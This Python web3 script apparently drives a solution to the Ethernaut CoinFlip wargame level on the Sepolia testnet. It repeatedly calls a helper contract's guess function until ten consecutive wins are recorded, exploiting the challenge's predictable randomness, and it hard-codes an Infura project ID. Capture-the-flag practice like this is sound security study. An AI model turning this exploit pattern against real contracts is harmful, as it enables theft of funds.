from web3 import Web3
from web3.middleware import construct_sign_and_send_raw_middleware
from eth_account import Account
import json
import os
import time

with open('/Users/eric/ethernaut/coin_flip/out/CoinFlipGuess.sol/CoinFlipGuess.json', 'rb') as f:
    info_json = json.load(f)
abi = info_json['abi']

def main():
    address = '0xF5aDC1aE888AB032B89C3A007F0e65FAf8d5C8AA'
    w3 = Web3(Web3.HTTPProvider('https://sepolia.infura.io/v3/2e13653d31524d4ead4a912aa89f7530'))
    acct = w3.eth.account.from_key(os.getenv('PRIVATE_KEY'))
    w3.middleware_onion.add(construct_sign_and_send_raw_middleware(acct))
    w3.eth.default_account = acct.address
    coin_flip = w3.eth.contract(address='0x637f58C2F5409677F4a6433f128E8A4Ac0b0d2ce', abi=abi)

    is_done = False
    while not is_done:
        tx = coin_flip.functions.guess(address).transact()
        receipt = w3.eth.wait_for_transaction_receipt(tx)
        print(receipt.status)
        ok_times = coin_flip.functions.consecutiveWins().call()
        if ok_times == 10:
            is_done = True
            print('done')
        time.sleep(15)

if __name__ == '__main__':
    main()